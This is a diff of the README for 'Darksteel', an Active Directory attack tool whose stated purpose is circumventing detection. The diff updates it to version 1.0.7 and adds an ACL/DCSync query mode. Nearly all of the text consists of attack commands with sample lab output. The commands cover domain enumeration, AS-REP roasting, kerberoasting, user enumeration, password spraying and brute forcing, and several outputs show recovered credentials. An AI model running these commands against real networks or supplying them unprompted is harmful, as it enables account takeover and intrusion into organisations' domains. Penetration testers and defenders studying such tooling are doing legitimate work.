@@ -2,25 +2,39 @@
 # Introduction
 Darksteel is a tool for automated information gathering and exploitation in the domain. In the penetration found that separate collection of information within the domain is tedious, vulnerability exploitation also requires a lot of tools, so the completion of this project to help me solve the problem of tedious collection of information within the domain and vulnerability exploitation problems. This project is completed with the main purpose of circumventing detection, the exploitation of direct attacks on the domain control is not done, because if there is a device will generate a large number of alerts, and subsequently may add the exploitation of bypass detection.
 ### New Features Demo
+The function of querying acl permission can only be used in windows at present.
 ```
-darksteel.exe computerip -domain test.com -dc 192.168.1.1 -user user -pass password(hash)
-
- ____    ______  ____    __  __   ____    ______  ____    ____    __   
-/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
-\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
+darksteel.exe computerip -dc 192.168.1.1 -domain test.com -file 123.txt
+ ____    ______  ____    __  __   ____    ______  ____    ____    __
+/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
+\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
  \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
-  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
-   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
-    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
+  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
+   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
+    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
 
-   v1.0.6
+   v1.0.7
 
 [*] Computer correspondence iP:
-        WIN-KQHTFQSIJSH  ————> A: 192.168.1.1
-        DESKTOP-A58D722  ————> A: 192.168.1.1
-        DESKTOP-DO1D913  ————> A: 192.168.1.1
-        WIN-9UI852PL  ————> A: 192.168.1.1
-        EXCHANGESERVER  ————> A: 192.168.1.1
+        WIN-KQH5FQSIJSH  ————> A: 192.168.1.46
+        DESKTOP-AO8D722  ————> A: 192.168.1.121
+        
+
+darksteel.exe ldap -dc 192.168.1.1 -domain test.com -user user -pass password(hash) -m sddl
+ ____    ______  ____    __  __   ____    ______  ____    ____    __
+/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
+\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
+ \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
+  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
+   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
+    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
+
+   v1.0.7
+
+[*] Acl :
+        qt 完全控制 ------> ac
+        qt 修改密码 ------> zz
+        qt01 拥有DCSync权限
 ```
 ### Features
 ```
@@ -38,15 +52,15 @@ Batch query the ip of the computer in the domain
 ```
 
 ```
- ____    ______  ____    __  __   ____    ______  ____    ____    __       
-/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \      
-\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \    
+ ____    ______  ____    __  __   ____    ______  ____    ____    __
+/\  _`\ /\  _  \/\  _`\ /\ \/\ \ /\  _`\ /\__  _\/\  _`\ /\  _`\ /\ \
+\ \ \/\ \ \ \L\ \ \ \L\ \ \ \/'/'\ \,\L\_\/_/\ \/\ \ \L\_\ \ \L\_\ \ \
  \ \ \ \ \ \  __ \ \ ,  /\ \ , <  \/_\__ \  \ \ \ \ \  _\L\ \  _\L\ \ \  _
-  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \ 
-   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
-    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
+  \ \ \_\ \ \ \/\ \ \ \\ \\ \ \\`\  /\ \L\ \ \ \ \ \ \ \L\ \ \ \L\ \ \ \L\ \
+   \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/
+    \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/
 
-   v1.0.6
+   v1.0.7
 
 Available Commands:
   darksteel ldap [parameter]
@@ -68,48 +82,50 @@ ldap Interact with LDAP server
   -ldapSizeLimit int
         Query LDAP maximum number (default 0)
   -m string
-        user 
-          Query all users in the domain 
-        computer 
-          Query all computers in the domain 
-        scomputer 
-          Query survival computer 
-        dc 
-          Query all domain controls in the domain 
-        spn 
-          Query all SPN in the domain 
-        ou 
-          All OU in the query domain 
-        mssql 
-          Query all mssql services in the domain 
-        asreproast 
-          Query users in the domain who can use as-rep roast 
-        maq 
+        user
+          Query all users in the domain
+        computer
+          Query all computers in the domain
+        scomputer
+          Query survival computer
+        dc
+          Query all domain controls in the domain
+        spn
+          Query all SPN in the domain
+        ou
+          All OU in the query domain
+        mssql
+          Query all mssql services in the domain
+        asreproast
+          Query users in the domain who can use as-rep roast
+        maq
           Query the value of maq in the domain
-        admins 
+        admins
           Query domain admins
-        enterprise 
+        enterprise
           Query enterprise admins
-        exchangecomputer 
+        exchangecomputer
           Query exchange computers
-        exchangesystem 
+        exchangesystem
           Query Exchange Trusted Subsystem
-        exchangeorgmanager 
+        exchangeorgmanager
           Query Exchange Organization Management
-        trustdomain 
+        trustdomain
           Query Trust Domain
-        adminsdholder 
+        adminsdholder
           Query the user whose permission is set for AdminSDHolder
-        sidhistory 
+        sidhistory
           Query the users who have set SIDHistory
-        cacomputer 
+        cacomputer
           Query adcs
-        esc1 
+        esc1
           Template that is threatened by esc1
-        esc2 
+        esc2
           Template that is threatened by esc2
-        computerip 
+        computerip
           Query the ip address of the computer in the domain
+        sddl
+          Query misconfigured acl
   -n string
         The field to query, you can write multiple
   -o string
@@ -119,13 +135,13 @@ ldap Interact with LDAP server
   -user string
         * Username in the domain
   -w string
-        all 
-          all delegate information 
-        uw 
-          unconstrained delegation information 
-        cw 
-          Constraint appointment information 
-        bw 
+        all
+          all delegate information
+        uw
+          unconstrained delegation information
+        cw
+          Constraint appointment information
+        bw
           Resource-based constraint delegation
 
 kerberos Do some Kerberos stuff
@@ -140,9 +156,9 @@ kerberos Do some Kerberos stuff
   -ldapsizelimit int
         Query LDAP maximum number (default 0)
   -m string
-        asreproast 
+        asreproast
           as-rep roast attack
-        kerberoast 
+        kerberoast
           kerberoasting attack
   -o string
         Output file position, default current directory
@@ -190,6 +206,8 @@ computerip Query the ip address of the computer in the domain
         * Please enter the IP of the domain control
   -domain string
         * Please enter the domain name
+  -file string
+        Query the list of machine's corresponding IP addresses
   -ldapSizeLimit int
         Query LDAP maximum number (default 0)
   -o string
@@ -213,22 +231,44 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [*] Domain User:
         Administrator
         Guest
-        WIN-KQH5FQSIJSH$
         krbtgt
-        DESKTOP-AO8D722$
-        DESKTOP-DO7D913$
+        wanliu
+        qt
         zz
         xx
-        WIN-7UI852PL$
+        exchangeuser
+        qt01
+        ac
+
+[*] Domain Admins:
+        CN=wanliu,CN=Users,DC=wanliu1,DC=com
+        CN=Administrator,CN=Users,DC=wanliu1,DC=com
+
+[*] AdminSDHolder:
+        Administrator
+        krbtgt
+        wanliu
+
+[*] sIDHistory:
+[*] Enterprise Admins:
+        CN=Administrator,CN=Users,DC=wanliu1,DC=com
 
 [*] OU :
         Domain Controllers
+        Microsoft Exchange Security Groups
+
+[*] Ca Computer:
+        wanliu1-WIN-KQH5FQSIJSH-CA
+
+[*] Esc1 vulnerability template:
+
+[*] Esc2 vulnerability template:
 
 [*] MsSql Computer:
         WIN-7UI852PL
@@ -239,97 +279,145 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
 [*] DC Computer:
         WIN-KQH5FQSIJSH
 
+[*] Acl :
+        qt 完全控制 ------> ac
+        qt 修改密码 ------> zz
+        qt01 拥有DCSync权限
+
+[*] Trust Domain:
+
 [*] Domain Computers:
         WIN-KQH5FQSIJSH
         DESKTOP-AO8D722
         DESKTOP-DO7D913
         WIN-7UI852PL
+        EXCHANGESERVER
 
 [*] Survival Computer:
         WIN-KQH5FQSIJSH --> Windows Server 2012 R2 Standard
         DESKTOP-AO8D722 --> Windows 10 专业版
         DESKTOP-DO7D913 --> Windows 10 专业版
         WIN-7UI852PL --> Windows Server 2008 R2 Enterprise
+        EXCHANGESERVER --> Windows Server 2016 Datacenter
+
+[*] Exchange Servers:
+        CN=EXCHANGESERVER,CN=Computers,DC=wanliu1,DC=com
+
+[*] Exchange Trusted Subsystem:
+        CN=EXCHANGESERVER,CN=Computers,DC=wanliu1,DC=com
+
+[*] Exchange Organization Management:
+        CN=Administrator,CN=Users,DC=wanliu1,DC=com
 
 [*] Asreproast User:
-        zz
+        xx
 
 [*] 非约束委派机器：
-        CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com [WIN-KQH5FQSIJSH]
+        CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=wanliu1,DC=com [WIN-KQH5FQSIJSH]
 [*] 非约束委派用户：
-        CN=zz,CN=Users,DC=test,DC=com [zz]
+        CN=zz,CN=Users,DC=wanliu1,DC=com [zz]
 [*] 约束委派机器：
-[*] 约束委派用户：
-        CN=xx,CN=Users,DC=test,DC=com [xx]
-        cifs/WIN-KQH5FQSIJSH.test.com/test.com
-        cifs/WIN-KQH5FQSIJSH.test.com
+        CN=WIN-7UI852PL,CN=Computers,DC=wanliu1,DC=com [WIN-7UI852PL]
+        cifs/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
+        cifs/WIN-KQH5FQSIJSH.wanliu1.com
         cifs/WIN-KQH5FQSIJSH
-        cifs/WIN-KQH5FQSIJSH.test.com/test
-        cifs/WIN-KQH5FQSIJSH/test
+        cifs/WIN-KQH5FQSIJSH.wanliu1.com/WANLIU1
+        cifs/WIN-KQH5FQSIJSH/WANLIU1
+[*] 约束委派用户：
 [*] 基于资源约束委派：
-        CN=DESKTOP-AO8D722,CN=Computers,DC=test,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[zz]
-        CN=DESKTOP-DO7D913,CN=Computers,DC=test,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[zz]
-        CN=WIN-7UI852PL,CN=Computers,DC=test,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[zz]
+        CN=DESKTOP-AO8D722,CN=Computers,DC=wanliu1,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[qt]
+        CN=DESKTOP-DO7D913,CN=Computers,DC=wanliu1,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[qt]
+        CN=WIN-7UI852PL,CN=Computers,DC=wanliu1,DC=com -> creator  S-1-5-21-3163795713-59934753-1752793692-1106[qt]
 
-[*] SPN：CN=xx,CN=Users,DC=test,DC=com
+[*] SPN：CN=xx,CN=Users,DC=wanliu1,DC=com
         cifs/admin
 
-[*] SPN：CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com
-        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WIN-KQH5FQSIJSH.test.com
-        ldap/WIN-KQH5FQSIJSH.test.com/ForestDnsZones.test.com
-        ldap/WIN-KQH5FQSIJSH.test.com/DomainDnsZones.test.com
+[*] SPN：CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=wanliu1,DC=com
+        exchangeAB/WIN-KQH5FQSIJSH
+        exchangeAB/WIN-KQH5FQSIJSH.wanliu1.com
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/WIN-KQH5FQSIJSH.wanliu1.com
+        ldap/WIN-KQH5FQSIJSH.wanliu1.com/ForestDnsZones.wanliu1.com
+        ldap/WIN-KQH5FQSIJSH.wanliu1.com/DomainDnsZones.wanliu1.com
         TERMSRV/WIN-KQH5FQSIJSH
-        TERMSRV/WIN-KQH5FQSIJSH.test.com
-        DNS/WIN-KQH5FQSIJSH.test.com
-        GC/WIN-KQH5FQSIJSH.test.com/test.com
-        RestrictedKrbHost/WIN-KQH5FQSIJSH.test.com
+        TERMSRV/WIN-KQH5FQSIJSH.wanliu1.com
+        DNS/WIN-KQH5FQSIJSH.wanliu1.com
+        GC/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
+        RestrictedKrbHost/WIN-KQH5FQSIJSH.wanliu1.com
         RestrictedKrbHost/WIN-KQH5FQSIJSH
-        RPC/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.test.com
-        HOST/WIN-KQH5FQSIJSH/test
-        HOST/WIN-KQH5FQSIJSH.test.com/test
+        RPC/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.wanliu1.com
+        HOST/WIN-KQH5FQSIJSH/WANLIU1
+        HOST/WIN-KQH5FQSIJSH.wanliu1.com/WANLIU1
         HOST/WIN-KQH5FQSIJSH
-        HOST/WIN-KQH5FQSIJSH.test.com
-        HOST/WIN-KQH5FQSIJSH.test.com/test.com
-        E3514235-4B06-11D1-AB04-00C04FC2DCD2/f20db9b6-b740-4670-ab3c-ead6acf58f4f/test.com
-        ldap/WIN-KQH5FQSIJSH/test
-        ldap/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.test.com
-        ldap/WIN-KQH5FQSIJSH.test.com/test
+        HOST/WIN-KQH5FQSIJSH.wanliu1.com
+        HOST/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/f20db9b6-b740-4670-ab3c-ead6acf58f4f/wanliu1.com
+        ldap/WIN-KQH5FQSIJSH/WANLIU1
+        ldap/f20db9b6-b740-4670-ab3c-ead6acf58f4f._msdcs.wanliu1.com
+        ldap/WIN-KQH5FQSIJSH.wanliu1.com/WANLIU1
         ldap/WIN-KQH5FQSIJSH
-        ldap/WIN-KQH5FQSIJSH.test.com
-        ldap/WIN-KQH5FQSIJSH.test.com/test.com
+        ldap/WIN-KQH5FQSIJSH.wanliu1.com
+        ldap/WIN-KQH5FQSIJSH.wanliu1.com/wanliu1.com
 
-[*] SPN：CN=DESKTOP-AO8D722,CN=Computers,DC=test,DC=com
+[*] SPN：CN=EXCHANGESERVER,CN=Computers,DC=wanliu1,DC=com
+        IMAP/EXCHANGESERVER
+        IMAP/exchangeserver.wanliu1.com
+        IMAP4/EXCHANGESERVER
+        IMAP4/exchangeserver.wanliu1.com
+        POP/EXCHANGESERVER
+        POP/exchangeserver.wanliu1.com
+        POP3/EXCHANGESERVER
+        POP3/exchangeserver.wanliu1.com
+        exchangeRFR/EXCHANGESERVER
+        exchangeRFR/exchangeserver.wanliu1.com
+        exchangeAB/EXCHANGESERVER
+        exchangeAB/exchangeserver.wanliu1.com
+        exchangeMDB/EXCHANGESERVER
+        exchangeMDB/exchangeserver.wanliu1.com
+        SMTP/EXCHANGESERVER
+        SMTP/exchangeserver.wanliu1.com
+        SmtpSvc/EXCHANGESERVER
+        SmtpSvc/exchangeserver.wanliu1.com
+        TERMSRV/EXCHANGESERVER
+        TERMSRV/exchangeserver.wanliu1.com
+        WSMAN/exchangeserver
+        WSMAN/exchangeserver.wanliu1.com
+        RestrictedKrbHost/EXCHANGESERVER
+        HOST/EXCHANGESERVER
+        RestrictedKrbHost/exchangeserver.wanliu1.com
+        HOST/exchangeserver.wanliu1.com
+
+[*] SPN：CN=DESKTOP-AO8D722,CN=Computers,DC=wanliu1,DC=com
         TERMSRV/DESKTOP-AO8D722
-        TERMSRV/DESKTOP-AO8D722.test.com
+        TERMSRV/DESKTOP-AO8D722.wanliu1.com
         RestrictedKrbHost/DESKTOP-AO8D722
         HOST/DESKTOP-AO8D722
-        RestrictedKrbHost/DESKTOP-AO8D722.test.com
-        HOST/DESKTOP-AO8D722.test.com
+        RestrictedKrbHost/DESKTOP-AO8D722.wanliu1.com
+        HOST/DESKTOP-AO8D722.wanliu1.com
 
-[*] SPN：CN=DESKTOP-DO7D913,CN=Computers,DC=test,DC=com
+[*] SPN：CN=DESKTOP-DO7D913,CN=Computers,DC=wanliu1,DC=com
         TERMSRV/DESKTOP-DO7D913
-        TERMSRV/DESKTOP-DO7D913.test.com
+        TERMSRV/DESKTOP-DO7D913.wanliu1.com
         RestrictedKrbHost/DESKTOP-DO7D913
         HOST/DESKTOP-DO7D913
-        RestrictedKrbHost/DESKTOP-DO7D913.test.com
-        HOST/DESKTOP-DO7D913.test.com
+        RestrictedKrbHost/DESKTOP-DO7D913.wanliu1.com
+        HOST/DESKTOP-DO7D913.wanliu1.com
 
-[*] SPN：CN=WIN-7UI852PL,CN=Computers,DC=test,DC=com
+[*] SPN：CN=WIN-7UI852PL,CN=Computers,DC=wanliu1,DC=com
         WSMAN/WIN-7UI852PL
-        WSMAN/WIN-7UI852PL.test.com
+        WSMAN/WIN-7UI852PL.wanliu1.com
         TERMSRV/WIN-7UI852PL
-        TERMSRV/WIN-7UI852PL.test.com
-        MSSQLSvc/WIN-7UI852PL.test.com:1433
-        MSSQLSvc/WIN-7UI852PL.test.com
+        TERMSRV/WIN-7UI852PL.wanliu1.com
+        MSSQLSvc/WIN-7UI852PL.wanliu1.com:1433
+        MSSQLSvc/WIN-7UI852PL.wanliu1.com
         RestrictedKrbHost/WIN-7UI852PL
         HOST/WIN-7UI852PL
-        RestrictedKrbHost/WIN-7UI852PL.test.com
-        HOST/WIN-7UI852PL.test.com
+        RestrictedKrbHost/WIN-7UI852PL.wanliu1.com
+        HOST/WIN-7UI852PL.wanliu1.com
 
-[*] SPN：CN=krbtgt,CN=Users,DC=test,DC=com
+[*] SPN：CN=krbtgt,CN=Users,DC=wanliu1,DC=com
         kadmin/changepw
 
-[*] SPN：CN=zz,CN=Users,DC=test,DC=com
+[*] SPN：CN=zz,CN=Users,DC=wanliu1,DC=com
         mssql/DESKTOP-AO8D722
 ```
 
@@ -344,7 +432,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 [*] CN=Administrators,CN=Builtin,DC=test,DC=com   --> 管理员对计算机/域有不受限制的完全访问权
 [*] CN=Schema Admins,CN=Users,DC=test,DC=com   --> 架构的指定系统管理员
@@ -364,7 +452,7 @@ darksteel.exe ldap -domain test.com -dc 192.168.1.1 -user user -pass password(ha
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 DN: CN=WIN-KQH5FQSIJSH,OU=Domain Controllers,DC=test,DC=com
 cn: [WIN-KQH5FQSIJSH]
@@ -393,7 +481,7 @@ darksteel.exe kerberos -m asreproast -dc 192.168.1.1 -domain test.com -user user
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 [*] Target domain: test.com (192.168.1.1)
 [*] Use LDAP to retreive vulnerable accounts
@@ -422,7 +510,7 @@ darksteel.exe kerberos  -m asreproast -dc 192.168.1.1 -domain test.com -tuser zz
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 [*] Target domain: test.com (192.168.1.1)
 [*] Ask AS-Rep for user zz without pre-authentication
@@ -449,7 +537,7 @@ darksteel.exe kerberos -m kerberoast -dc 192.168.1.1 -domain test.com -user user
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [*] Target domain: test.com (192.168.1.1)
@@ -504,7 +592,7 @@ darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [+] USERNAME:    zz@test.com
@@ -522,7 +610,7 @@ darksteel.exe blast -m userenum -dc 192.168.1.1 -domain test.com -userfile users
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [!] asdfqwadad@test.com - User does not exist
@@ -543,7 +631,7 @@ darksteel.exe blast -m passspray -dc 192.168.1.1 -domain test.com -userfile user
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [+] SUCCESS:     zz@test.com:123456
@@ -562,7 +650,7 @@ darksteel.exe blast -m blastpass -dc 192.168.1.1 -domain test.com -user zz -pass
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [+] SUCCESS:     zz@test.com:123456
@@ -581,7 +669,7 @@ darksteel.exe blast -m userpass -dc 192.168.1.1 -test.com -upfile userpass.txt
    \ \____/\ \_\ \_\ \_\ \_\ \_\ \_\\ `\____\ \ \_\ \ \____/\ \____/\ \____/  
     \/___/  \/_/\/_/\/_/\/ /\/_/\/_/ \/_____/  \/_/  \/___/  \/___/  \/___/   
     
-   v1.0.2
+   v1.0.7
 
 
 [+] SUCCESS:     zz@test.com:123456
